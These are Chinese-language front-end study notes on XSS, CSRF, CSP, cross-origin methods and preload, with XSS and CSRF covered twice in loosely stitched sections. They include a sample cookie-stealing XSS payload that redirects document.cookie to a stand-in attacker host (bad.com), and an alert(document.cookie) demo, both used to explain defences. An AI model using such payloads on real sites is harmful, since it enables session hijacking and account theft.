1、XSS (Cross Site Scripting)，跨站脚本攻击。为了和层叠样式表(Cascading Style Sheets，CSS)区分开，跨站脚本在安全领域叫做 XSS。攻击者往 Web 页面里注入恶意代码，当用户浏览这些网页时，就会执行其中的恶意代码，可对用户进行盗取 cookie 信息、会话劫持、改变网页内容、恶意跳转等各种攻击。XSS 是常见的 Web 攻击技术之一，由于跨站脚本漏洞易于出现且利用成本低，所以被 OWASP 列为当前的头号 Web 安全威胁。
举一个简单的例子##
在 a.com 的搜索输入框中输入如下内容，并提交请求
<script>location.href=http://www.bad.com/?cookie=document.cookie</script>
如果前端没有进行过滤，浏览器地址可能变为：
http://www.a.com/?query=<script>location.href=http://www.bad.com/?cookie=document.cookie</script>
http://www.a.com/?query=<script>location.href=http://www.bad.com/?cookie=document.cookie</script>
此时，用户的 cookie 信息已经被发送到攻击者的服务器，攻击者便能利用收集的 cookie 信息来伪造用户身份，进行多种恶意非法操作。
XSS 攻击类型一般分为三种：
1、反射型 XSS
反射型 XSS 只是简单的把用户输入的数据“反射”给浏览器，XSS 脚本出现在 URL 请求参数里，也就是说需要诱使用户“点击”一个恶意链接，才能攻击成功。反射型 XSS 也叫作非持久型 XSS。
2、储存型 XSS
存储型 XSS 也被称为持久型 XSS，当攻击者输入一段恶意脚本后，被服务端接受保存，当用户访问这个页面时，恶意脚本就会被执行，从而造成漏洞。
3、DOM Based XSS
基于 DOM 的 XSS，通过对具体 DOM 代码进行分析，根据实际情况构造 DOM 节点进行 XSS 跨站脚本攻击。
防范 XSS
对于 XSS 攻击，我们可以做如下防范：
1、输入过滤。永远不要相信用户的输入，对用户输入的数据做一定的过滤。如输入的数据是否符合预期的格式，比如日期格式，Email 格式，电话号码格式等等。同时，后台服务器需要在接收到用户输入的数据后，对特殊危险字符进行过滤或者转义处理，然后再存储到数据库中。
2、输出编码。服务器端输出到浏览器的数据，可以使用系统的安全函数来进行编码或转义来防范 XSS 攻击。输出 HTML 属性时可以使用 HTML 转义编码（HTMLEncode）进行处理，输出到页面脚本代码中，可以相应进行 Javascript encode 处理。
3、HttpOnly Cookie。预防 XSS 攻击窃取用户 cookie 最有效的防御手段。Web 应用程序在设置 cookie 时，将其属性设为 HttpOnly，就可以避免该网页的 cookie 被客户端恶意 JavaScript 窃取，保护用户 cookie 信息。
4、WAF(Web Application Firewall)，Web 应用防火墙，主要的功能是防范诸如网页木马、XSS 以及 CSRF 等常见的 Web 漏洞攻击。由第三方公司开发，在企业环境中深受欢迎。

## CSRF
CSRF (Cross Site Request Forgery)，即跨站请求伪造。简单的理解是，攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF 能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账等，造成个人隐私泄露，财产损失。<br>
举个例子，受害者用户登录网站 A，输入个人信息，在本地保存服务器生成的 cookie。攻击者构建一条恶意链接，例如对受害者在网站 A 的信息及状态进行操作，典型的例子就是转账。受害者打开了攻击者构建的网页 B，浏览器发出该恶意连接的请求，浏览器发起会话的过程中发送本地保存的 cookie 到网址 A，A 网站收到 cookie，以为是受害者发出的操作，导致受害者的身份被盗用，完成攻击者恶意的目的。<br>

### 防范 CSRF
对于 CSRF 攻击，我们可以做如下防范：<br>
1、验证码。应用程序和用户进行交互过程中，特别是账户交易这种核心步骤，强制用户输入验证码，才能完成最终请求。在通常情况下，验证码够很好地遏制 CSRF 攻击。但增加验证码降低了用户的体验，网站不能给所有的操作都加上验证码。所以只能将验证码作为一种辅助手段，在关键业务点设置验证码。<br>
2、Referer Check。HTTP Referer 是 header 的一部分，当浏览器向 Web 服务器发送请求时，一般会带上 Referer 信息告诉服务器是从哪个页面链接过来的，服务器以此可以获得一些信息用于处理。可以通过检查请求的来源来防御 CSRF 攻击。正常请求的 referer 具有一定规律，如在提交表单的 referer 必定是在该页面发起的请求。所以通过检查 http 包头 referer 的值是不是这个页面，来判断是不是 CSRF 攻击。<br>
3、Anti CSRF Token。目前比较完善的解决方案是加入 Anti-CSRF-Token，即发送请求时在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器建立一个拦截器来验证这个 token。服务器读取浏览器当前域 cookie 中这个 token 值，会进行校验该请求当中的 token 和 cookie 当中的 token 值是否都存在且相等，才认为这是合法的请求。否则认为这次请求是违法的，拒绝该次服务。<br>

### CSP(内容安全策略)

CSP(Content Security Policy) 即内容安全策略，主要目标是减少、并有效报告 XSS 攻击，其实质就是让开发者定制一份白名单，告诉浏览器允许加载、执行的外部资源。即使攻击者能够发现可从中注入脚本的漏洞，由于脚本不在白名单之列，浏览器也不会执行该脚本，从而达到了降低客户端遭受 XSS 攻击风险和影响的目的。<br>
默认配置下，CSP 甚至不允许执行内联代码 (<script> 块内容，内联事件，内联样式)，以及禁止执行eval(), setTimeout 和 setInterval。为什么要这么做呢？因为制定来源白名单依旧无法解决 XSS 攻击的最大威胁：内联脚本注入。浏览器无法区分合法内联脚本与恶意注入的脚本，所以通过默认禁止内联脚本来有效解决这个问题。<br>
事实上我们并不推荐使用内联脚本混合的开发方式，使用外部资源，浏览器更容易缓存，对开发者也容易阅读理解，并且有助于编译和压缩。当然，如果不得不需要内联脚本和样式，可以通过设置 unsafe-inline，来解除这一限制。<br>

## XSS(Cross Site Scripting)是跨站脚本攻击，为了区分CSS，所以缩写为XSS。XSS攻击方式是往Web页面插入恶意的 JavaScript 代码，当用户浏览网页的时候，插入的代码就是被执行，从而达到攻击的目的。

其中应用比较多的一个就是，在网页一些公用的交互区域。比如搜索的文本框，除了可以输入一些关键字，还可以输入一些 JavaScript 代码，一旦代码点击搜索，代码就会被执行，达到攻击的目的。如下例子<br>
```<script>alert(document.cookie);</script>```

在文本框中输入以上代码，然后点击提交，就会把用户的cookie弹出来。<br>
### XSS防范
1.将重要的cookies标记为HTTP ONLY，让JavaScript代码无法调用，只有http能调用。或者将重要的信息保存在session里面。<br>
2.只允许用户输入我们期望的数据。如消费金额框只能输入数字和小数点。<br>
3.对数据进行加密处理。<br>
4.过滤或者移除特殊的HTML标签，过滤JavaScript代码等。<br>
### 2、CSRF（Cross-site request forgery）是跨站请求伪造。XSS利用站点内的信任用户，与XSS不同，CSRF是通过伪装来自受信任用户，在受信任的网站进行请求，盗取信息。其实就是攻击者盗用了受害者的身份，以受害者的名义向网站发送恶意请求。

### CSRF的防御
1.在表单里增加Hash值，以认证这确实是用户发送的请求，然后在服务器端进行Hash值验证。<br>
2.验证码：每次的用户提交都需要用户在表单中填写一个图片上的随机字符串。<br>
3.修改，增加重要信息，比如密码，个人信息的操作，尽量使用post。避免使用get把信息暴露在url上面。<br>
5.渲染过程，原理<br>
1.浏览器通过DNS对URL进行解析，找出对应的IP地址；<br>
2.向IP地址发起网络请求，进行http协议会话：客户端发送报头（请求报头），服务端回馈报头（响应报头）<br>
3.服务器根据请求，交给后台处理，处理完成后返回文件数据，浏览器接收文件数据（HTML、JS、CSS、图象等）；返回一个页面（根据页面上的外链的URL重新发送请求获取）<br>
4.浏览器接收文件完毕，对加载到的资源进行语法解析，以及相应的内部数据结构（网页渲染）<br>
### 跨域
1、 jsonp<br>
2、 document.domain + iframe<br>
3、 location.hash + iframe<br>
4、 window.name + iframe<br>
5、 postMessage<br>
6、 跨域资源共享（CORS）<br>
7、 nginx代理<br>
8、 nodejs中间件代理<br><br>
9、 WebSocket协议<br>
# 前端性能优化
1、有一种优化交preload<br>
时候为了提高网页初始加载的性能，我们会选择延迟一部分资源的加载和执行。<br>
preload是一个预加载关键字。它显式地向浏览器声明一个需要提前加载的资源。使用方式如下：<br>

在<head>中写入<link rel="preload" href="some-resource-url" as="xx">（包括用JS创建<link>元素并插入到<head>）<br>

在HTTP头部加上Link: <some-resource-url>; rel=preload; as=xx<br>

当浏览器“看”到这样的声明后，就会以一定的优先级在后台加载资源。加载完的资源放在HTTP缓存中。而等到要真正执行时，再按照正常方式用标签或者代码加载，即可从HTTP缓存取出资源。<br>

使用Preload加载资源的方式有以下几个特点：<br>

提前加载资源<br>

资源的加载和执行分离<br>

不延迟网页的load事件（除非Preload资源刚好是阻塞 window 加载的资源）<br>

### XSS防范
